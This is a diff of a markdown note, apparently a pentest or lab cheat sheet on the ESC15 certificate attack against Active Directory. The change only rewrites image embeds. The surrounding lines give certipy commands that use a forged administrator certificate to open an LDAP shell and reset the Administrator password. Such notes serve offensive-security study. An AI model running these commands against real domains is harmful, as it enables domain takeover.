@@ -2,13 +2,13 @@
     
     - template might always be WebServer but I’m not sure
     
-![[../../assets/ESC15/image 415.png|image 415.png]]
+![image 415.png](../../assets/ESC15/image%20415.png)
   
 with the administrator.pfx, authenticate to an LDAP shell
 - certipy auth -pfx administrator.pfx -dc-ip <IP> -ldap-shell
-![[../../assets/ESC15/image 1 310.png|image 1 310.png]]
+![image 1 310.png](../../assets/ESC15/image%201%20310.png)
   
   
 from here, you can change the administrator password
 - change_password Administrator <password>
-![[../../assets/ESC15/image 2 261.png|image 2 261.png]]
+![image 2 261.png](../../assets/ESC15/image%202%20261.png)
